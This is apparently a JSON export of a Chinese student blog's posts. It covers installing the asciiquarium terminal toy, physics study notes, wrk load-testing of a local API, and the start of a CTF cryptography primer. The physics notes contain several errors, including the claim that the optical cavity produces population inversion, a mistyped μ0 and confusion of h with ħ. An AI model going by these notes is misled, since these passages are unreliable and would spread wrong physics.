口袋物理。嗯……感觉更像小册子的感觉。用来过知识点挺不错。","link":"/2021/03/22/%E5%AD%A6%E7%A7%91%E5%B7%A5%E5%85%B7%E9%9B%86/"},{"title":"试试终端养鱼（Linux）！","text":"我在Ubuntu上得安装点依赖，主要是Cursor和Animation；剩下的很简单。 1234567891011121314# 安装cursesudo apt-get install libcurses-perl# 安装Animationwget http://search.cpan.org/CPAN/authors/id/K/KB/KBAUCOM/Term-Animation-2.4.tar.gztar -zxvf Term-Animation-2.4.tar.gz ; cd Term-Animation-2.4/perl Makefile.PL &amp;&amp; makemake install; cd ..# 安装asciiquarium本体wget http://www.robobunny.com/projects/asciiquarium/asciiquarium.tar.gztar -zxvf asciiquarium.tar.gzcd asciiquarium_1.1/sudo cp asciiquarium /usr/local/binsudo chmod +x /usr/local/bin/asciiquariumasciiquarium #如果不行的话，重启终端 效果这样：","link":"/2023/05/31/%E8%AF%95%E8%AF%95%E7%BB%88%E7%AB%AF%E5%85%BB%E9%B1%BC%EF%BC%88Linux%EF%BC%89%EF%BC%81/"},{"title":"激光与固体物理笔记","text":"激光器组成 激励能源 工作物质（含有亚稳态能级） 光学谐振腔 一、受激吸收、自发辐射和受激辐射普通光源：自发发光；区别于激光源的受激发光。 按照原子的量子理论，光和原子的相互作用能引起下面三种跃迁过程。 受激吸收 设原子位于$E_1$低能级，且存在高能级$E_2$。当入射光子能量为$hv=E_2-E_1$时，原子就有可能吸收光子并跃迁到$E_2$。这也称为原子的光激发。 自发辐射 激发态原子状态不稳定，无外界作用下，其会自发跃迁到低能级，同时放出一个光子。这光子的能量为$hv=E_2-E_1$。普通光源的发光就属于自发辐射。由于发光物质中各个原子自发独立进行辐射，因此光子的相位、偏振态、传播方向均无固定关系。对大量原子而言，即使都是从$E_2$跃迁到$E_1$，发出的同频率的光也是不相干的。 ![[img/Pasted image 20221215113330.png]] 受激辐射 爱因斯坦发现，辐射场和原子交换能量时，只靠自发辐射和吸收不能达到热平衡，因此还必须存在受激辐射。 位于高能态$E_2$的原子在自发辐射以前，如果受到能量为$hv=E_2-E_1$的外来光子诱发作用，就有可能从$E_2$跃迁到$E_1$，同时发射一个与外来光子频率、相位、偏振态和传播方向都相同的光子。也就是说，一个光子能引发两个状态完全相同的光子。若由它们继续向下引发，则能的带大量特征相同的光子，即光放大的实现。这样产生的光为相干光。 ![[img/Pasted image 20221215113710.png]] 二、产生激光的基本条件1.粒子数反转光和原子系统相互作用时，总是存在上述三种过程。而受激吸收和受激辐射是两种矛盾的过程：前者减少光子数，后者增加光子数。 2.光学谐振腔为了实现粒子数反转，需要在工作物质周围构造一个光学谐振腔。光学谐振腔是由两个反射镜和工作物质构成的，其中一个反射镜是半透明的，可以让一部分光子透过，另一部分光子被反射回来。当工作物质被激发时，它会发出光子，这些光子在谐振腔内来回反射，与工作物质不断相互作用，从而增强光子的能量和数量。当光子数达到一定程度时，就会出现粒子数反转，从而产生激光。光学谐振腔的长度和反射镜的反射率等参数决定了激光的波长和输出功率等特性。","link":"/2022/12/15/%E7%89%A9%E7%90%86/%E6%BF%80%E5%85%89%E4%B8%8E%E5%9B%BA%E4%BD%93%E7%89%A9%E7%90%86%E7%AC%94%E8%AE%B0/"},{"title":"物理学术竞赛：选题讨论","text":"选题结果一眼看过去就能水直接有思路的有这么几个： 💿光盘绿条纹绿是因为光栅衍射，条纹是因为……光沿直线传播，以及光盘的光学、材料特征？ 或者谷歌解决了也行。感觉这东西谷歌应该有不少资料。 螺钉下滑一旦螺钉摆动到某一点时，摩擦力不足以提供圆周运动的向心力，它就会沿斜面向下滑动——将重力势能转化为动能，而这会使得其速度越来越大。因此，越过临界点之后，他就会无休止地开始下滑，并逐渐加速。 对于它的分析，由于钉子比较小，因此只在单摆运动时考虑其转动惯量，下滑时由于是平动，因此整体受力分析+牛二即可。在它尚未下滑之前，给它初摆角后，需结合向心运动加速度公式分析它是否会滑下斜面。 提米米瓶实验其实就是摩擦力，以及力学传导的问题。将筷子/勺子插入米瓶中，再向上提，会连着瓶子一块提起来。此过程中：筷子受到米的挤压力和向下的摩擦力，米对瓶子各向均有力的作用，但瓶子受到米的合力向上。 可以先从整体法分析，瓶子受到米向上的合力，这部分分量由瓶壁与米的摩擦力和瓶顶受到米向上的支持力提供；对于筷子而言，筷子受到米竖直向下的摩擦力。 如果仅仅是描述现象的话那应该相对比较容易。定量计算的话感觉还是有些麻烦的。 微粒上浮初步分析应该是张力把微粒吸上去的速度大于水滴的下落速度，从而产生了微粒似乎在往上走的现象。 选题上大致就是这样。第二个倒是能直接做出来，第一个感觉应该能查资料解决；后两个纯粹定性描述一下就行了。 编辑：拿奖了，校级。但是忘了登我的名字。下次还是多关注一下群里的通知吧🤣👉🤡","link":"/2022/11/19/%E7%89%A9%E7%90%86/%E7%89%A9%E7%90%86%E5%AD%A6%E6%9C%AF%E7%AB%9E%E8%B5%9B%EF%BC%9A%E9%80%89%E9%A2%98%E8%AE%A8%E8%AE%BA/"},{"title":"狭义相对论笔记","text":"大物中只涉及狭义相对论时空观、高速运动力学的基本方程和相对论动力学主要结论。 0x01.伽利略坐标变换式·力学相对性原理经典牛顿力学体系中，对于时空的看法以绝对时空观为核心。它认为，时空是不变的，是“一个固定的舞台”。它也认为，力学规律亦是如此。 力学相对性原理定义：在所有彼此做匀速直线运动的惯性系中，物体运动遵循完全相同的力学规律，这规律有着完全相同的数学表达式。 这也就是说，对于描述力学现象的规律而言，所有惯性系都是等价的。因此，也不能通过力学实验来确定当前惯性系是静止的，还是做匀速直线运动的。 绝对时空观：时间和空间都是绝对的，可以脱离物质运动而存在，并且时间与空间也没有任何联系。 这观点表现在对时间间隔和空间间隔的测量上，则表现为：所有惯性系中，任意两个观察者对于任意两个事件的时间间隔、空间间隔测量结果都相同。 伽利略坐标变换式基于绝对时空观，假设有两个惯性系$S$和$S’$，取坐标系$Oxyz$和$O’x’y’z’$分别与$S$和$S’$相联系，使它们的$x$轴重合，设$S’$系沿$x$轴相对$S$以速度$u$运动，并且当$O$与$O’$重合时，有$t=t’=0$。 设$P$点在$S$系中的坐标是$(x,y,z)$，在$S’$中的坐标是$(x’,y’,z’)$，则有： $$\\left{\\begin{aligned}x’&amp;=x-ut\\y’&amp;=y\\z’&amp;=z\\\\end{aligned}\\right.$$ 同时，根据绝对时空观，有： $$t’=t$$ 这就是伽利略坐标变换式。同时，从它还可以推导出速度、加速度的变换式： $$\\begin{aligned}v’&amp;=v-u\\a’&amp;=a\\end{aligned}$$ 同时，由于经典力学认为，质量与其运动速度无关，即 $$m=m’$$ 同时，质点在不同惯性系下受到的作用力$F=F’$，从而有 $$F’=m’a’$$ 这表明牛顿第二定律具有伽利略变换的不变性。 但是，描述宏观电磁现象规律的麦克斯韦方程组不具有伽利略变换的不变性。这使得二者具有冲突，即，二者之一必然被修正。于是诞生了狭义相对论。 0x02.狭义相对论的两个基本假设光是电磁波，由麦克斯韦方程组可得，光的真空传播速率是 $$c=\\frac{1}{\\sqrt{\\epsilon_0\\mu_0}}=2.998\\times 10^8m/s$$ 它是常量。这表明光的真空各向传播速率与参考系的选择以及光的传播方向无关。然而由经典伽利略变换可得出，在不同参考系测量同一束光的结果应该不同，例如$A$系结果是$c$，则与之相对速度为$u$的$B$系测量结果应当为$c\\pm u$，但是1887年利用迈克尔逊干涉仪完成的迈克尔逊-莫雷实验所测定的各向光速依旧为$c$。这对经典力学体系产生了巨大的冲击。 而爱因斯坦则从一个新的角度着手：自然界是对称的，电磁学、力学等一切物理学现象应当满足相对性原理。这也就是说，所有惯性系中的物理规律及其数学表达式是相同的。因此，并不能找到一个特殊的、同时满足经典力学和麦克斯韦方程组的惯性系。此外，将实验结果得到的光速不变作为一个基本假设提出。基于这两条假设，他建立了狭义相对论。 狭义相对论的两个基本假设 相对性原理：在所有惯性系中，一切的物理学定律都相同，即具有相同的数学表达形式。即，对于描述一切物理现象的规律，所有惯性系等价。 光速不变原理：在所有惯性系中，真空中光沿各向传播速率是常量$c$，与光源和观察者的运动状态无关。 0x03.狭义相对论时空观同时性的相对性假设$S’$系（火车）相对$S$系（地面）以速度$u$运动，火车箱中间有一个电灯，打开它，则在$S’$中观察到它光同时到达列车始末；但是在$S$上观察，会得到光先到达车厢后部，再到达车厢前端（相对火车运动方向而言）。因此，在$S’$系中异地同时发生的两个事件，在$S$系中并不同时。也就是说，“同时性”具有相对性。 同时性的相对性是狭义相对论的一个基本结论，它表明了时间的相对性。在不同的惯性系中，时间的流逝速率是不同的。这一结论与经典牛顿力学的绝对时空观是不同的，它是狭义相对论的一个重要特征。 同时性的相对性可以通过著名的钟慢效应来进行实验验证。例如，将两个精密的原子钟分别放在地面和飞行的飞机上，当飞机飞行一段时间后，两个钟的时间差就会变得非常明显。这一效应已经被实验验证过，验证结果与狭义相对论的预测非常吻合。 同时性的相对性也是狭义相对论的一个重要基础，它为后续的狭义相对论理论奠定了基础。","link":"/2022/11/01/%E7%89%A9%E7%90%86/%E7%8B%AD%E4%B9%89%E7%9B%B8%E5%AF%B9%E8%AE%BA%E7%AC%94%E8%AE%B0/"},{"title":"电磁学笔记","text":"静电场之所以叫静电场是为了强调场源电荷是相对静止的。因为下面的部分规则对于运动电荷/电流形成的电场不一定适用。 点电荷元电荷的电量： $e=1.6 \\times 10^{-19}C$。电荷是量子化分布的，元电荷是电荷的最小单位。任何电量都是元电荷的整数倍。 真空中静止点电荷间的作用力大小为 $F=\\frac{1}{4\\pi \\epsilon_0}\\frac{q_1q_2}{r^2}$，其中 $\\epsilon_0=8.85\\times 10^{-12}C^2/(N \\cdot m^2)$。 电场点电荷会向外发出电场。它是物质的另一种非实体存在形式，其对于位于其内的其他电荷有力的作用。它的定义如下： 定义式： $E=\\frac{d\\Phi}{dS}$，即：单位面积通过的电场线条数称为某一点的场强。 $d\\Phi$称为电通量。电场线是人们假想的，描述某一点电场强度的量。 高斯定律： $\\oint_SE\\cdot dS=\\frac{1}{\\epsilon_0}\\Sigma q$，q为高斯面内的电荷量代数和。 通过高斯定律我们能看出，电场是有源无旋场。 知道了空间某一区域内的电荷量之后，便可以通过高斯定律计算出来该高斯面上的平均电场强度。因此，对于受一定几何条件约束，存在对称性的空间区域，就可以利用高斯定理计算其表面的场强。 下面是一些特殊静电场的场强： 描述 公式 球面内 $E=0$ 球面外 $E=\\frac{q}{4\\pi \\epsilon_0}\\frac{1}{r^2}$ 球体内 $E=\\frac{q}{4\\pi \\epsilon_0}\\frac{r}{R^3}=\\frac{\\rho}{3\\epsilon_0}r$ 球体外 $E=\\frac{q}{4\\pi\\epsilon_0}\\frac{1}{r^2}$ 长直导线 $E=\\frac{\\lambda}{2\\pi\\epsilon_0r}$ 圆盘周线上的场强：$$E=\\frac{\\delta x}{2\\epsilon_0}[\\frac{1}{\\sqrt{x^2+R_1^2}}-\\frac{1}{x^2+R^2}]$$ 电偶极子电偶极子是一个理想化的模型：一对带有等量异号电荷，电量分别为 $+q,-q$的点电荷，彼此距离为 $l$。规定电偶极矩为 $p=ql$，其中 $l$的方向为：从负电荷指向正电荷。下面是位于电偶极子特殊位置的场强（其中 $r \\gg l$）： 沿轴线方向的场强： $E=\\frac{2p}{4\\pi\\epsilon_0r^3}$ 中垂线上的场强： $E=-\\frac{p}{4\\pi\\epsilon_0r^3}$ 一般情况场强： $E=\\frac{1}{4\\pi\\epsilon_0r^3}[\\frac{3(r\\cdot p)r}{r^2}-p]$ 电势规定某一点处的电势为：$\\phi=-\\int^P_{\\infty}E\\cdot dr=\\int_P^{\\infty}E\\cdot dr$。也就是说，在匀强场中，有 $U=Ed$。 同时，电场具有下面的特性：$\\oint E\\cdot dr = 0$，即静电场和重力场一样，是保守场。 两点间的电势差：$U_{12}=\\phi_1-\\phi_2=-\\Delta\\phi$，单位： $1V=1J/C$ 场强和电势还有如下关系： $E=-\\nabla\\phi$，即某点的场强为该点电势的梯度的负值。 静电场中的导体导体静电平衡条件： $E_{in}=0\\text{（即导体内电场为0）}, E_s\\perp\\text{导体表面}$。当导体处于静电平衡时，有 $\\delta=\\epsilon_0E$。有导体存在时，静电场的计算借助静电场的基本规律，电荷守恒和导体经典平衡条件。 静电屏蔽：金属空壳外表面的电荷和壳外的电荷在壳内的合场强为0，因而对壳内场强无影响。 唯一性定理：给定每个导体的总电量、电势，或者一些导体的总电量和另一些导体的电势，静电场的分布就唯一地确定了。电场的计算可以使用镜像法。 静电场中的介质将介质插入电容器，则有：$U=\\frac{U_0}{\\epsilon_r}$。又因为 $E=\\frac{U}{d}$，因而有 $E=\\frac{E_0}{\\epsilon_r}$ 根据正负电中心是否重合，可以把分子分为两类：极性分子：有固有电矩；非极性分子：无固有电矩。外加电场会产生比固有电矩小得多的感生电矩，出现在电介质表面的电荷叫面束缚电荷/面极化电荷。分子电矩和电偶极子的电矩定义相同，为 $p=ql$。 此外，对于有电介质存在的电场，引入电位移D，有：$D=\\epsilon_0E+P$。其中 $P=np$，P是电极化强度，n是电介质单位体积内的分子数（$P$单位$C/m^2$） 此时，高斯定理变形为 $\\oint D\\cdot dS = \\Sigma q$。其中， $q$是自由电荷，$D=\\epsilon E = \\epsilon_0\\epsilon_r E$。 边界条件： $E_{1t}=E_{2t}D_{1n}=D_{2n}$ 电容器电容器具有电容 $C$， 其定义为：$C=\\frac{Q}{U}$。电容器和电阻一样可以进行串并联，且遵循:并联 $C$相加，串联 $C$倒数相加。 电介质填充规律： 按等势面填充: $D$不变, $E$变 按电场线填充: $D$变, $E$的分布“样子”不变（？） 电容器的能量： $W=\\frac{1}{2}CU^2=\\frac{1}{2}QU=\\frac{1}{2}\\frac{Q^2}{C}$ 电场中的能量体密度： $W_c=\\frac{1}{2}DE=\\frac{1}{2}\\epsilon E^2$ 电场中的能量： $W=\\int \\frac{1}{2}\\epsilon E^2dV$ 常见电容器的电容计算： 平行板： $C=\\frac{\\epsilon S}{d}$ 圆柱形： $C=\\frac{2\\pi L\\epsilon}{ln(\\frac{R_2}{R_1})}$ 球形电容器： $C=4\\pi\\epsilon\\frac{R_1R_2}{R_2-R_1}$ 球形孤立导体电容器： $C=4\\pi R\\epsilon$ 磁场磁力是运动电荷之间相互作用的表现。 洛伦兹力：运动电荷受到磁场的作用力，为 $F=qv\\times B$ 磁通量是单位面积通过的磁感线的量，为 $\\int_SB\\cdot dS$。磁通量用于描述某点的磁感应强度。 毕萨定律描述了单位电流元在空间某一点产生的磁感应强度：$dB=\\frac{\\mu_0}{4\\pi}\\frac{Idl\\times e_r}{r^2}$。方向通过右手螺旋定律即可确定。其中， $\\mu_0$为真空磁导率，为： $\\mu_0=\\frac{1}{\\epsilon_0c^2}=4\\pi\\times 19^{-7}N/A^2$，$c=\\frac{1}{\\sqrt{\\mu_0\\epsilon_0}}$ 磁通连续性定理：$\\oint B\\cdot dS=0$， $dB=\\frac{\\mu_0}{4\\pi}\\frac{qv\\times e_r}{r^2}$ 安培环路定理： $\\oint B\\cdot dr=\\mu_0\\Sigma I_{in}$ 也就是说，沿着某条闭合路径对磁场作路径积分，得到的值就是穿过其中的电流的代数和。其中，以右手定则确定正电流的方向。 也可以写作如下形式： $$\\oint B\\cdot dR=\\mu_0\\int_S(J_c+\\epsilon_0\\frac{\\delta E}{\\delta t}\\cdot dS)$$ 传导电流 $I_c$， 位移电流 $I_d=\\epsilon_0\\frac{d\\Phi}{dt}=\\epsilon_0\\frac{d}{dt}\\int_SE\\cdot dS$，位移电流密度： $J_d=\\epsilon_0\\frac{\\delta E}{\\delta t}$， 全电流： $I=I_c+I_d$ 典型电流分布的磁场无限长直电流 $$B=\\frac{\\mu_0I}{2\\pi r}$$一段直导线（上面情况的一般化）$$B=\\frac{\\mu_0I}{4\\pi r}(cos\\theta_1-cos\\theta_2)$$无限长均匀载流薄圆筒 $$B_{in}=0 ;B_{out}=\\frac{\\mu_0I}{2\\pi r}$$无限长直载流密绕螺绕管 / 螺绕环 $$B_{in}=\\mu_0nI; B_{out}=0$$$n$是单位长度的匝数。显然，对于螺绕环，有 $n=\\frac{N}{2\\pi r}$ 无限大平面电流 $$B\\cdot2l=\\mu_0jl$$圆电流圈中心点和轴线上的磁场 $$B_{center}=\\frac{\\mu_0I}{2R}; B_{axis}=\\frac{\\mu_0IS}{2\\pi(R^2+x^2)^{\\frac{3}{2}}}$$ 磁矩$$B=\\frac{\\mu_0}{4\\pi r^3}[\\frac{3(r\\cdot m)r}{r^2}-m]$$ 其中， $r\\gg\\text{磁矩线度}$ 磁矩、电流圈在外磁场中的势能 $W=-mB_{\\text{外}}=-IS\\cdot B_{\\text{外}}$ $$r=\\frac{mv}{qB}$$ $$T=\\frac{2\\pi m}{qB}v$$ 霍尔效应： $$U_H=R_H\\frac{IB}{d};F=\\int_LIdl\\times B$$ 磁矩： $$m=SIe_n$$ 力矩： $$M=m\\times B$$ 导线框受到的力矩就可以像上边这么计算。磁矩就是导线框面积和导线框电流的乘积。若线圈有$N$匝，则乘以$N$即可。 电磁感应感应电动势： $$E=\\frac{d\\phi}{dt}=-N\\frac{d\\phi}{dt}$$当穿过各匝线圈的磁通量相等时,N 匝线圈的全磁通为 $\\Psi=N\\Phi$ 动生电动势 $E=\\oint_L(v\\times B)dl$，$\\lvert E\\rvert=Blv$感生电动势 $\\oint_LE_i\\cdot dl=-\\frac{d\\phi}{dt}=-\\int_S\\frac{\\delta B}{\\delta t}\\cdot dS$。其中， $E_i$表示感生电场，由于静电场的环路积分为零, 所以 $\\oint_LE\\cdot dr=-\\int_S \\frac{\\delta B}{\\delta t}\\cdot dS$ $$\\Psi_{21}=M_{21}i_1 \\E_{12}=-\\frac{d\\psi_{21}}{dt}=-M_{21}\\frac{di}{dt}$$$M_{21}$是回路 $L_1$对回路 $L_2$的互感系数, 固定回路的互感系数是一个常数, $M_{21}=M_{12}=M$，$M$称作这两个导体回路的互感系数, 简称他们的互感。 $$E_L=-\\frac{d\\psi}{dt}=-L\\frac{di}{dt},L=\\frac{\\psi}{i}$$称为自感系数，简称自感 自感磁能 $$W_m=\\frac{1}{2}LI^2$$ 磁场的能量 $$W_m=\\frac{B^2}{2\\mu}V=\\int \\frac{BH}{2}dV$$ 磁能量密度 $$W_m=\\frac{1}{2}BH=\\frac{1}{2}\\mu H^2$$ 麦克斯韦方程组和电磁辐射$$\\left{\\begin{aligned}&amp;\\oint_SE\\cdot dS =\\frac{q}{\\epsilon_0}=\\frac{1}{\\epsilon_0}\\int_V\\rho dV\\&amp;\\oint_SB\\cdot dS =0\\&amp;\\oint_LE\\cdot dr =-\\frac{d\\psi}{dt}=-\\int_S\\frac{\\delta B}{\\delta t}\\cdot dS\\&amp;\\oint_LB\\cdot dr =\\mu_0I+\\frac{1}{c^2}\\frac{d\\Phi_c}{dt}=\\mu_0\\int_S(J+\\epsilon_0\\frac{\\delta E}{\\delta t})\\end{aligned}\\right.$$ 麦克斯韦方程组是描述电磁场的基本方程组，包括四个方程：高斯定律、安培环路定理、法拉第电磁感应定律和磁场无源性定理。这四个方程分别描述了电荷、电流、电场和磁场之间的相互作用关系。其中，高斯定律描述了电荷对电场的影响，安培环路定理描述了电流对磁场的影响，法拉第电磁感应定律描述了磁场对电场的影响，磁场无源性定理描述了磁场的本质特性。 电磁辐射是指电磁波在空间中的传播过程。电磁波是由电场和磁场相互作用而产生的一种波动现象，其传播速度为光速。电磁辐射的产生需要满足一定的条件，即电荷或电流的加速度必须存在。电磁辐射的能量密度与电场和磁场的强度有关，其传播方向垂直于电场和磁场的方向。电磁辐射在通信、雷达、医学等领域有着广泛的应用。","link":"/2022/10/25/%E7%89%A9%E7%90%86/%E7%94%B5%E7%A3%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"},{"title":"量子力学笔记","text":"黑体辐射黑体是能量吸收率100%的物体。黑体辐射就是黑体在温度$T$时发射的辐射。它的总辐射能和温度的四次方成正比，而单色辐出度的峰值和温度成反比。 光电效应金属受波长$\\lambda$的光照射，会发出电子，其初动能只与金属遏止频率和光照频率有关，在加速电压作用下，会遏止（电压等于初动能）或者达到饱和（所有电子都被加速到阴极） $$\\frac{1}{2}mv_m^2=eU_\\text{遏止}$$ 光量子假说$$h\\nu=\\frac{1}{2}mv_m^2+A$$ 就是光子能量$\\epsilon=h\\nu$等于光子最大初动能+逸出功。光子能量大于逸出功就开始逸出，多余的能量就是最大初动能。刚好逸出时，有$\\nu_0=\\frac{A}{h}$。这就是遏止频率。 波粒二象性动质量： $m_\\phi=\\frac{\\epsilon}{c^2}=\\frac{h\\nu}{c^2}$，由相对论得出。静质量为0动量： $p=m_\\phi c=\\frac{h\\nu}{c}=\\frac{h}{\\lambda}$ 康普顿效应一束X射线经过石墨散射后，有的直着过去了，有的偏转了点角度，还有的被弹回去了。角度改变的粒子大多能量都变低了。 波长偏移角$\\Delta \\lambda = \\lambda-\\lambda_0$随着散射角$\\phi$（散射线与入射线的夹角）的增大而增大，且入射角越大，偏移的越多，没偏移的粒子数越少 上面的多少变化随着原子序数的增加变得越来越不明显，即，原子序数大的粒子，所有粒子的偏移角虽然没变，但是偏移的粒子数目越来越少。 $\\Delta\\lambda=\\lambda-\\lambda_0=\\frac{h}{m_0c}(1-cos\\phi)=2\\lambda_csin^2\\frac{\\phi}{2}$ 上面的$\\lambda_c$是康普顿波长，和原子无关 玻尔的氢原子理论 巴尔默系：$\\frac{1}{\\lambda}=\\frac{4}{B}(\\frac{1}{2^2}-\\frac{1}{n^2})$ B是常量，它表示氢原子光谱中各谱线的波长。把B和2换成其他数就能得到光谱的其他线系。 德布罗意波质量$m$的粒子以速度$v$运动时，具有能量$E$和动量$p$，也具有波长$\\lambda$和频率$\\nu$，它们遵从： $E=mc^2=h\\nu$ $p=mv=\\frac{h}{\\lambda}$ 故有静质量粒子的平面单色波（物质波）波长是： $$\\lambda=\\frac{h}{p}=\\frac{h}{m_0v}=\\frac{h}{m_0v}\\sqrt{1-(\\frac{v}{c})^2}$$ 对于电子轨道，只有物质波满足驻波条件，才能在轨道稳定传播： $$2\\pi r=n\\lambda, n=1,2,3,\\cdots$$ 代入$\\lambda=\\frac{h}{mv}$，得 $$mvr=n\\frac{h}{2\\pi},n=1,2,3,\\cdots$$ 即轨道角动量量子化条件。将康普顿实验的X光换为粒子来测量微观粒子波长后，证实了德布罗意的猜想，电子的波动性。 不确定性原理物质不是单色平面波，所以动量不确定。而微观粒子位置也有不确定度。这俩满足 $$\\Delta x\\Delta p_x\\geq\\frac{h}{2}$$ 对其他三个坐标一样。还有一个不确定性原理： $$\\Delta E\\Delta t\\geq \\frac{h}{2}$$ 波函数因为上述的不确定性原理，需要用波函数描述微观粒子运动状态。 $$y(x,t)=y_0cos2\\pi(\\nu t-\\frac{x}{\\lambda})$$ 代入物质波规律，得到： $$f(x,t)=f_0e^{-i\\frac{2\\pi}{h}(Et-px)}$$ 这就是能量为$E$，动能$p$，沿$x$方向运动的物质波的波函数。在空间某地点，粒子出现的概率正比于当前状态波函数的平方。 某状态粒子出现概率正比于波函数和它共轭复数的乘积。归一化条件：$\\int_V|f|^2dV=1$。波函数是单值、有限、连续（包括其一阶导）而且是归一化的函数。 薛定谔方程$$-\\frac{h^2}{2m}\\frac{\\delta^2y}{\\delta x^2}=ih\\frac{\\delta y}{\\delta t}$$ 在势场中，有 $$-\\frac{h^2}{2m}\\frac{\\delta^2y}{\\delta x^2}+U(x,t)y=ih\\frac{\\delta y}{\\delta t}$$ 能量公式： $$E=\\frac{n^2\\pi^2h^2}{2ma^2}=E_n,=1,2,3,\\cdots$$ 概率密度： $$|y_n(x)|^2=\\frac{2}{a}sin^2\\frac{n\\pi}{a}x,n=1,2,3,\\cdots$$ 对$x$求导一次，求它的零点，得概率最大位置$x=(2N+1)\\frac{a}{2n}$ 角动量空间量子化电子绕核运动的$L$的取向量子化。其中，$L$表示角动量。它在外磁场方向$Z$的投影为 $$L_z=m_lh$$ 磁量子数：$m_l=0,\\pm 1, \\pm 2, \\cdots , \\pm l$。即，$m_l$取值受$l$限制。 对同一个$l$，角动量方向有$2l+1$个可能的取值，合大小不变。 例如，$l=2$时，电子角动量大小为$L=\\sqrt{2(2+1)}h=\\sqrt{6}h$，空间取向$L_z=2h,h,0,-h,-2h$。 ![[img/Pasted image 20221215104108.png]] 四个量子数在量子力学中，每个电子的状态都由四个量子数描述。这些量子数分别是： 主量子数（$n$）：主量子数表示电子所处的能级。它的取值为正整数（1、2、3……），并决定了电子的能量大小。主量子数越大，能量越高，电子所处的轨道也越远离原子核。 角量子数（$l$）：角量子数决定电子轨道的形状。它的取值为 0 到 n-1 的非负整数，表示电子在该能级中的角动量大小。不同的角量子数对应不同的轨道形状，如 l=0 对应 s 轨道，l=1 对应 p 轨道，l=2 对应 d 轨道，以此类推。 磁量子数（$m_l$）：磁量子数描述电子在轨道上的位置。它的取值为 -l 到 l 的整数，共有 2l+1 种可能性。不同的磁量子数对应不同的轨道空间取向，例如对于 l=1 的 p 轨道，m 取值为 -1、0、1，分别对应着三个不同的空间方向。 自旋量子数（$m_s$）：自旋量子数描述电子的自旋性质。它的取值为 +1/2 或 -1/2，表示电子自身的自旋方向。自旋量子数是一个纯粹的量子现象，与经典物理中的旋转概念并不相同。 例如，氢原子中处于$3d$量子态的电子，其量子态的四个量子数$(n,l,m_l,m_s)$可能取的值为$(3,2,-2\\to2,\\pm \\frac{1}{2})$","link":"/2022/12/15/%E7%89%A9%E7%90%86/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6%E7%AC%94%E8%AE%B0/"},{"title":"API压测笔记","text":"API的压力测试是业务上线前的重要环节，也是对系统性能的一个量化测量，对实际业务诸方面都有重要的参考价值。 这里主要说说API压测的方法和常用手段。 压测方法 go benchmark 如果是golang后端，可以直接手写测试用例，然后使用go工具链自带的benchmark进行压测。 ApacheBench ab命令会创建多个并发访问线程，模拟多个访问者同时对某一URL地址进行访问。 安装apache2-utils即可在系统上使用ab命令。 作为演示，使用ab测试一个GET接口： 1ab -n 2000 -c 1200 &quot;http://127.0.0.1:9999/get_result?a=10&amp;b=20&quot; n: 测试轮次 c: 客户端数量 T: 内容类型 p: 包含post参数的文件 引号是必须的 wrk 一个C编写的API压测工具 1wrk -t10 -c100 -d10s http://localhost:8080/api/users # 使用10个线程，100并发数，测试持续10s 开测我最后还是选了wrk做压测因为ab装不上 测试接口是POST http://localhost:8080/api/calc/mul，payload是一个2*n的json格式的二维数组。 测试指令： 123456wrk -t 20 -c 10000 -d 180s -s bench.lua --latency &quot;http://localhost:8080/api/calc/mul&quot;## bench.luawrk.method = &quot;POST&quot;wrk.body = &quot;[[1,2,3,1],[4,5,7,8]]&quot;wrk.headers['Content-Type'] = &quot;application/json&quot; 测试结果如下： 12345678910111213141516xeonds@ark-station:~/code/vec-calculator-server$ make bench cd build &amp;&amp; ./vec-calc-web-linux-amd64-1.0.0 &amp; sleep 1 &amp;&amp; \\wrk -t 20 -c 10000 -d 180s -s bench.lua --latency &quot;http://localhost:8080/api/calc/mul&quot;Running 3m test @ http://localhost:8080/api/calc/mul 20 threads and 10000 connections Thread Stats Avg Stdev Max +/- Stdev Latency 61.27ms 62.15ms 1.46s 93.06% Req/Sec 9.74k 1.33k 22.11k 71.75% Latency Distribution 50% 48.47ms 75% 66.32ms 90% 90.10ms 99% 364.05ms 34884275 requests in 3.00m, 4.35GB readRequests/sec: 193693.29Transfer/sec: 24.75MB 测试平台是Intel Core i7-12700H，可以看到并发在1,0000的时候，Gin的性能还是不错的，TPS保持在了19万的水准。 碎碎念该说不该说呢，以前我认为语言就是由语法和编译器/解释器构成，但是Golang这样从语法上支持一个feature的行为让我疑惑：语言的标准库该不该算是语言特性的一部分？ go这个关键字作为一个大大的语法糖，似乎在打破语言的库和语言本身的分界线。我也无从知晓这一方向的尽头是什么。 Reference API性能测试指标以及压测方式 - 最难不过二叉树 - 知乎 golang压测 How To Benchmark HTTP Latency with wrk on Ubuntu 14.04 - DigitalOcean POST request with wrk? - StackOverflow Can I disable gin’s stdout? - GitHub Issue","link":"/2024/03/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/API%E5%8E%8B%E6%B5%8B%E7%AC%94%E8%AE%B0/"},{"title":"Crypto入门指北","text":"关于密码学顾名思义就是研究加密的学科。比如要在Alice与Bob两人通信过程中，在有Eve窃听的情况下，依然保证消息不泄露，这就需要Alice用一个加密密钥（类似于开锁的钥匙）对信息加密，而Bob将收到的信息用解密密钥解密，这样Eve就无法得知通信内容。而凯撒密码就是十分著名的一种加密方式，将字母移位，从而达到加密的目的，凯撒密码属于古典密码，在平台的Classic Crypto分类中就有许多这样的密码。但是它们的安全性都基于对加密算法的保护，一旦加密算法暴露，哪怕没有密钥，也能够进行解密。因此，现代密码学要求在加密算法公开的情况下，只要不知道密钥，就无法对消息进行解密。这样的话，仅需要保护一个不算长的密钥即可保护一段信息；即使密钥泄露，换个密钥就能继续用同一个加密算法加密。所以，密码学就是要寻找一个在不知道密钥情况下无法破解的算法。因此，下面这些题目，都会有一个用python写的加密脚本，这些都是有漏洞的加密方式，你需要从中找出漏洞，并且在没有密钥的情况下恢复明文。 密码学需要什么基础知识 数学基础： 密码学是数学的一个应用学科，最早的公钥密码算法RSA就是基于数论的，因此学习密码学通常还需要从数论开始学起，公钥密码往后发展的过程中，也逐步用到了线性代数与抽象代数的内容，那些东西由于过难在本次新生赛不会涉及，因此请先从数论开始（除了用于防大佬新生ak的Easy RSA有用到线性代数的复杂知识，想要钻研的这题的新生请慎重）。其次，最早不是基于数学的块密码，在发展的过程中，也被运用数学的语言来描述，从而更能够更清晰的找到攻击方法。因此，学习密码学会涉及到大量的数学知识，欢迎对数学感兴趣（至少不讨厌）的同学来钻研学习 编程基础： 